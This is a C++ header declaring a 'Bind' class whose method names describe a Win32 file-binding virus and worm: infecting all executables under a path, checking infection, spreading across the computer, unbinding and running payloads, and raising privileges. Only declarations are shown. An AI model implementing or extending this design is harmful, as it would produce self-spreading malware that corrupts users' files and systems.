// Bind.h: interface for the Bind class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_BIND_H__FAE5C6FD_8881_48CC_A389_28044B6B8B8F__INCLUDED_)
#define AFX_BIND_H__FAE5C6FD_8881_48CC_A389_28044B6B8B8F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "StructDef.h"

class Bind  
{
public:
	void WormWin32Computer();
	void Unbind_and_Run();
	bool Bind_Files(char* strSourExe);
	Bind(char* strBaseExe,char* strShellExe);
	virtual ~Bind();
	bool CheckInfect(char* strExePath);
private:
	void InfectWin32AllFiles(char * lpPath);
	void UnbindFile(char* strSourcFile,char* strDesFile,unsigned int iBegin,unsigned int iSize);
	void Create_Process(const char* temp_exe, BOOL async);
	
	bool CompFile(FILE* DesFileIO,char* strSourFile);
	int SplitFilePath(CString strFilePath,CString &strOutFileName);
	void BackUpFile(char* strSourFile,char* strDesFile);
	BOOL EnablePrivilege();
	
	char my_name[256];
	char File1[256];
	BYTE *buf ;
};

#endif // !defined(AFX_BIND_H__FAE5C6FD_8881_48CC_A389_28044B6B8B8F__INCLUDED_)
